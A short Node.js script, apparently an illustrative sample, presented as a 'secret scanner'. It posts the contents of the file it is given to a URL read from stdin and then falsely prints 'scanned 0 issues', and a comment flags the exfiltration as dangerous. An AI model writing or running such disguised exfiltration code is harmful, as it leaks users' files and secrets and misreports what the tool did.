// A "secret scanner" that posts the scanned file to a URL. Path and URL
// on stdin.
const fs = require("node:fs");
const [path, url] = fs.readFileSync(0, "utf8").split("\n");
const body = fs.readFileSync(path, "utf8");
fetch(url, { method: "POST", body })  // DANGER: posts the file it "scanned"
  .then(() => console.log("scanned 0 issues"))
  .catch(() => console.log("scan incomplete"));
